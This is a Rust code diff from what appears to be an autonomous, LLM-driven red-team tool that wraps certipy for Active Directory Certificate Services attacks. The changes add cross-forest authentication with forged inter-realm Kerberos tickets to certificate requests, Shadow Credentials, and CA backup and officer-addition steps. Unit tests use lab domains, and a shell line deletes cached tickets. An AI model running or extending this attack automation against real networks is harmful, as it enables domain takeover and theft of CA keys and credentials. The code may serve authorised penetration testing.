@@ -35,32 +35,67 @@ fn epoch_millis() -> u128 {
         .unwrap_or(0)
 }
 
+/// Switch a certipy invocation into cross-forest Kerberos mode using a forged
+/// inter-realm ccache. Adds `-k -no-pass` and exports `KRB5CCNAME` (plus the
+/// per-ccache `KRB5_CONFIG` shim) so certipy presents the cached service ticket
+/// instead of attempting NTLM auth — which a foreign, SID-filtered DC rejects
+/// with `rpc_s_access_denied` / `ept_s_not_registered`. Mirrors the
+/// `ticket_path → KRB5CCNAME` wiring in `recon.rs` / `acl.rs` (Bug B): the
+/// credential resolver injects `ticket_path` for cross-forest certipy calls, and
+/// `tool_consumes_ticket_path()` must list the tool or the injection is silently
+/// dropped.
+fn apply_certipy_kerberos(cmd: CommandBuilder, ccache: &str) -> CommandBuilder {
+    cmd.arg("-k")
+        .arg("-no-pass")
+        .env("KRB5CCNAME", ccache)
+        .env("KRB5_CONFIG", format!("{ccache}.krb5.conf:/etc/krb5.conf"))
+}
+
 /// Enumerate ADCS certificate templates and CAs using Certipy.
 ///
 /// Required args: `username`, `domain`, `dc_ip`
-/// Optional args: `password`, `hashes`, `vulnerable`
+/// Optional args: `password`, `hashes`, `ticket_path`, `vulnerable`
 pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
+    match build_certipy_find_command(args)? {
+        Some(cmd) => cmd.execute().await,
+        None => {
+            // Fail soft when the worker credential_resolver could not inject
+            // any auth (no password, hash, or cross-forest ticket for this
+            // principal). Hard-erroring with `required_str("password")?` caused
+            // the LLM to "Assistance requested" and burn ~30k tokens reasoning
+            // about a missing credential field; a structured stdout line lets
+            // the agent move on.
+            let username = required_str(args, "username")?;
+            let domain = required_str(args, "domain")?;
+            Ok(ToolOutput {
+                stdout: format!(
+                    "certipy_find: no credential resolved for {username}@{domain} (neither password, hash, nor cross-forest ticket in state); skipping enumeration.\n"
+                ),
+                stderr: String::new(),
+                exit_code: Some(0),
+                success: true,
+            })
+        }
+    }
+}
+
+/// Build the `certipy find` command. Returns `Ok(None)` when no authentication
+/// material (password, hash, or cross-forest ticket) resolved for the principal
+/// so the async wrapper can emit a soft-skip line instead of a hard error.
+///
+/// Auth precedence: `ticket_path` (cross-forest ccache) > `hashes` > `password`.
+#[doc(hidden)]
+pub fn build_certipy_find_command(args: &Value) -> Result<Option<CommandBuilder>> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let vulnerable = optional_bool(args, "vulnerable").unwrap_or(true);
-    let hashes = optional_str(args, "hashes");
-    let password = optional_str(args, "password");
+    let hashes = optional_str(args, "hashes").filter(|s| !s.is_empty());
+    let password = optional_str(args, "password").filter(|s| !s.is_empty());
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
-    // Fail soft when the worker credential_resolver could not inject any
-    // auth (neither password nor hash found in state for this principal).
-    // Hard-erroring with `required_str("password")?` caused the LLM to
-    // "Assistance requested" and burn ~30k tokens reasoning about a missing
-    // credential field; a structured stdout line lets the agent move on.
-    if password.is_none() && hashes.is_none() {
-        return Ok(ToolOutput {
-            stdout: format!(
-                "certipy_find: no credential resolved for {username}@{domain} (neither password nor hash in state); skipping enumeration.\n"
-            ),
-            stderr: String::new(),
-            exit_code: Some(0),
-            success: true,
-        });
+    if ticket_path.is_none() && password.is_none() && hashes.is_none() {
+        return Ok(None);
     }
 
     let user_at_domain = format!("{username}@{domain}");
@@ -74,24 +109,40 @@ pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
         .arg_if(vulnerable, "-vulnerable")
         .timeout_secs(120);
 
-    if let Some(h) = hashes {
+    if let Some(ccache) = ticket_path {
+        cmd = apply_certipy_kerberos(cmd, ccache);
+    } else if let Some(h) = hashes {
         cmd = cmd.flag("-hashes", h);
     } else if let Some(p) = password {
         cmd = cmd.flag("-p", p);
     }
 
-    cmd.execute().await
+    Ok(Some(cmd))
 }
 
 /// Request a certificate from an ADCS CA using Certipy.
 ///
-/// Required args: `username`, `domain`, `password`, `ca`, `template`, `dc_ip`
+/// Required args: `username`, `domain`, `ca`, `template`, `dc_ip`, and one of
+///   `password` or `ticket_path` (cross-forest ccache).
 /// Optional args: `upn`, `target` (CA server IP/hostname — use when CA is not on the DC),
 ///   `sid` (SID to embed in cert), `out` (output PFX filename)
 pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
+    build_certipy_request_command(args)?.execute().await
+}
+
+/// Build the `certipy req` command. Auth precedence: `ticket_path`
+/// (cross-forest ccache via `-k -no-pass`) > `password`.
+#[doc(hidden)]
+pub fn build_certipy_request_command(args: &Value) -> Result<CommandBuilder> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
-    let password = required_str(args, "password")?;
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
+    let password = optional_str(args, "password").filter(|s| !s.is_empty());
+    if ticket_path.is_none() && password.is_none() {
+        anyhow::bail!(
+            "certipy_request requires a password or cross-forest ticket_path — got neither"
+        );
+    }
     let ca = required_str(args, "ca")?;
     let template = required_str(args, "template")?;
     let dc_ip = required_str(args, "dc_ip")?;
@@ -111,10 +162,9 @@ pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
 
     let user_at_domain = format!("{username}@{domain}");
 
-    CommandBuilder::new("certipy")
+    let mut cmd = CommandBuilder::new("certipy")
         .arg("req")
         .flag("-username", user_at_domain)
-        .flag("-password", password)
         .flag("-ca", ca)
         .flag("-template", template)
         .flag("-dc-ip", dc_ip)
@@ -123,9 +173,15 @@ pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
         .flag_opt("-upn", upn)
         .flag_opt("-sid", sid)
         .flag_opt("-application-policies", application_policies)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .timeout_secs(120);
+
+    if let Some(ccache) = ticket_path {
+        cmd = apply_certipy_kerberos(cmd, ccache);
+    } else if let Some(p) = password {
+        cmd = cmd.flag("-password", p);
+    }
+
+    Ok(cmd)
 }
 
 /// Authenticate with a PFX certificate using Certipy.
@@ -158,12 +214,29 @@ pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
 /// Perform Certipy Shadow Credentials attack (auto mode).
 ///
 /// Required args: `username`, `domain`, `target`, `dc_ip`
-/// Required (one of): `password`, `hashes`
+/// Required (one of): `ticket_path` (cross-forest ccache), `password`, `hashes`
 pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
+    // certipy shadow auto internally calls certipy auth which writes .ccache
+    // based on the target account name. Remove existing .ccache to prevent the
+    // interactive "Overwrite? (y/n)" prompt.
+    let _ = tokio::process::Command::new("sh")
+        .arg("-c")
+        .arg("rm -f *.ccache 2>/dev/null")
+        .output()
+        .await;
+
+    build_certipy_shadow_command(args)?.execute().await
+}
+
+/// Build the `certipy shadow auto` command. Auth precedence: `ticket_path`
+/// (cross-forest ccache via `-k -no-pass`) > `hashes` > `password`.
+#[doc(hidden)]
+pub fn build_certipy_shadow_command(args: &Value) -> Result<CommandBuilder> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
     let target = required_str(args, "target")?;
     let dc_ip = required_str(args, "dc_ip")?;
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
     // Treat an empty-string `hashes` as missing so the password fallback
     // fires. The LLM agent has been observed passing `hashes=""` when only
     // a password is available — without this guard the `-hashes ''` flag
@@ -178,15 +251,6 @@ pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
         None => format!("shadow_{target}_{}", epoch_millis()),
     };
 
-    // certipy shadow auto internally calls certipy auth which writes .ccache
-    // based on the target account name. Remove existing .ccache to prevent the
-    // interactive "Overwrite? (y/n)" prompt.
-    let _ = tokio::process::Command::new("sh")
-        .arg("-c")
-        .arg("rm -f *.ccache 2>/dev/null")
-        .output()
-        .await;
-
     let mut cmd = CommandBuilder::new("certipy")
         .arg("shadow")
         .arg("auto")
@@ -196,14 +260,16 @@ pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
         .flag("-out", out)
         .timeout_secs(120);
 
-    if let Some(h) = hashes {
+    if let Some(ccache) = ticket_path {
+        cmd = apply_certipy_kerberos(cmd, ccache);
+    } else if let Some(h) = hashes {
         cmd = cmd.flag("-hashes", h);
     } else {
         let password = required_str(args, "password")?;
         cmd = cmd.flag("-password", password);
     }
 
-    cmd.execute().await
+    Ok(cmd)
 }
 
 /// Certipy CA management operations (add-officer, issue-request, backup).
@@ -216,9 +282,21 @@ pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
 ///     Requires SYSTEM-equivalent access on the CA host (e.g., the calling
 ///     process is running on a host where `username` is local administrator).
 pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
+    build_certipy_ca_command(args)?.execute().await
+}
+
+/// Build the `certipy ca` command. Auth precedence: `ticket_path` (cross-forest
+/// ccache via `-k -no-pass`) > `password`. A forged inter-realm ticket lets the
+/// `-backup` / `-add-officer` RPC hit a foreign CA that rejects NTLM.
+#[doc(hidden)]
+pub fn build_certipy_ca_command(args: &Value) -> Result<CommandBuilder> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
-    let password = required_str(args, "password")?;
+    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
+    let password = optional_str(args, "password").filter(|s| !s.is_empty());
+    if ticket_path.is_none() && password.is_none() {
+        anyhow::bail!("certipy_ca requires a password or cross-forest ticket_path — got neither");
+    }
     let dc_ip = required_str(args, "dc_ip")?;
     let ca = required_str(args, "ca")?;
 
@@ -234,10 +312,15 @@ pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
     let mut cmd = CommandBuilder::new("certipy")
         .arg("ca")
         .flag("-username", user_at_domain)
-        .flag("-password", password)
         .flag("-dc-ip", dc_ip)
         .flag("-ca", ca)
         .timeout_secs(180);
+
+    if let Some(ccache) = ticket_path {
+        cmd = apply_certipy_kerberos(cmd, ccache);
+    } else if let Some(p) = password {
+        cmd = cmd.flag("-password", p);
+    }
 
     if add_officer {
         cmd = cmd.flag("-add-officer", format!("{username}@{domain}"));
@@ -249,7 +332,7 @@ pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
         cmd = cmd.arg("-backup");
     }
 
-    cmd.execute().await
+    Ok(cmd)
 }
 
 /// Forge a "Golden Certificate" from a stolen CA PFX (the `-backup` output of
@@ -1443,6 +1526,164 @@ mod tests {
             "ca": "contoso-CA", "pfx_path": "/tmp/admin.pfx"
         });
         assert!(super::certipy_esc4_full_chain(&args).await.is_ok());
+    }
+
+    // --- cross-forest Kerberos wiring (Bug B, certipy subset) ---
+
+    // A forged inter-realm ccache for a contoso.local -> fabrikam.local trust.
+    const XFOREST_CCACHE: &str =
+        "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache";
+
+    #[test]
+    fn certipy_find_uses_kerberos_when_ticket_path_present() {
+        let args = json!({
+            "username": "administrator", "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.240", "ticket_path": XFOREST_CCACHE
+        });
+        let cmd = super::build_certipy_find_command(&args)
+            .unwrap()
+            .expect("ticket_path must yield a command, not a soft-skip");
+        let a = cmd.args_for_test();
+        assert!(a.iter().any(|x| x == "-k"), "expected -k: {a:?}");
+        assert!(
+            a.iter().any(|x| x == "-no-pass"),
+            "expected -no-pass: {a:?}"
+        );
+        assert!(
+            a.iter().all(|x| x != "-p" && x != "-hashes"),
+            "no password/hash flags in Kerberos mode: {a:?}"
+        );
+        let envs = cmd.env_vars_for_test();
+        assert!(
+            envs.iter()
+                .any(|(k, v)| k == "KRB5CCNAME" && v == XFOREST_CCACHE),
+            "KRB5CCNAME must export the ccache: {envs:?}"
+        );
+    }
+
+    #[test]
+    fn certipy_find_uses_password_without_ticket() {
+        let args = json!({
+            "username": "admin", "domain": "contoso.local",
+            "password": "P@ssw0rd!", "dc_ip": "192.168.58.240"
+        });
+        let cmd = super::build_certipy_find_command(&args).unwrap().unwrap();
+        let a = cmd.args_for_test();
+        assert!(a.iter().any(|x| x == "-p"), "expected -p: {a:?}");
+        assert!(a.iter().all(|x| x != "-k"), "no -k without a ticket: {a:?}");
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .all(|(k, _)| k != "KRB5CCNAME"));
+    }
+
+    #[test]
+    fn certipy_find_no_auth_returns_none() {
+        // No password, hash, or ticket — the wrapper soft-skips.
+        let args = json!({
+            "username": "admin", "domain": "contoso.local", "dc_ip": "192.168.58.240"
+        });
+        assert!(super::build_certipy_find_command(&args).unwrap().is_none());
+    }
+
+    #[test]
+    fn certipy_request_ticket_only_authenticates() {
+        let args = json!({
+            "username": "administrator", "domain": "fabrikam.local",
+            "ca": "fabrikam-CA", "template": "User", "dc_ip": "192.168.58.240",
+            "ticket_path": XFOREST_CCACHE
+        });
+        let cmd = super::build_certipy_request_command(&args).unwrap();
+        let a = cmd.args_for_test();
+        assert!(a.iter().any(|x| x == "-k"), "expected -k: {a:?}");
+        assert!(
+            a.iter().any(|x| x == "-no-pass"),
+            "expected -no-pass: {a:?}"
+        );
+        assert!(
+            a.iter().all(|x| x != "-password"),
+            "no -password in Kerberos mode: {a:?}"
+        );
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, _)| k == "KRB5CCNAME"));
+    }
+
+    #[test]
+    fn certipy_request_requires_password_or_ticket() {
+        let args = json!({
+            "username": "admin", "domain": "contoso.local",
+            "ca": "contoso-CA", "template": "ESC1", "dc_ip": "192.168.58.240"
+        });
+        let err = match super::build_certipy_request_command(&args) {
+            Ok(_) => panic!("expected an error when neither password nor ticket_path is present"),
+            Err(e) => e.to_string(),
+        };
+        assert!(
+            err.contains("password or cross-forest ticket_path"),
+            "unexpected error: {err}"
+        );
+    }
+
+    #[test]
+    fn certipy_ca_ticket_only_authenticates() {
+        let args = json!({
+            "username": "administrator", "domain": "fabrikam.local",
+            "dc_ip": "192.168.58.240", "ca": "fabrikam-CA", "backup": true,
+            "ticket_path": XFOREST_CCACHE
+        });
+        let cmd = super::build_certipy_ca_command(&args).unwrap();
+        let a = cmd.args_for_test();
+        assert!(a.iter().any(|x| x == "-k"), "expected -k: {a:?}");
+        assert!(
+            a.iter().any(|x| x == "-backup"),
+            "backup flag preserved: {a:?}"
+        );
+        assert!(
+            a.iter().all(|x| x != "-password"),
+            "no -password in Kerberos mode: {a:?}"
+        );
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, _)| k == "KRB5CCNAME"));
+    }
+
+    #[test]
+    fn certipy_ca_requires_password_or_ticket() {
+        let args = json!({
+            "username": "admin", "domain": "contoso.local",
+            "dc_ip": "192.168.58.240", "ca": "contoso-CA", "backup": true
+        });
+        let err = match super::build_certipy_ca_command(&args) {
+            Ok(_) => panic!("expected an error when neither password nor ticket_path is present"),
+            Err(e) => e.to_string(),
+        };
+        assert!(
+            err.contains("password or cross-forest ticket_path"),
+            "unexpected error: {err}"
+        );
+    }
+
+    #[test]
+    fn certipy_shadow_prefers_ticket_over_password() {
+        let args = json!({
+            "username": "administrator", "domain": "fabrikam.local",
+            "target": "ws01$", "dc_ip": "192.168.58.240",
+            "ticket_path": XFOREST_CCACHE, "password": "ignored-in-kerberos-mode"
+        });
+        let cmd = super::build_certipy_shadow_command(&args).unwrap();
+        let a = cmd.args_for_test();
+        assert!(a.iter().any(|x| x == "-k"), "expected -k: {a:?}");
+        assert!(
+            a.iter().all(|x| x != "-password"),
+            "ticket must shadow the password: {a:?}"
+        );
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, _)| k == "KRB5CCNAME"));
     }
 
     // --- render_chain_output ---
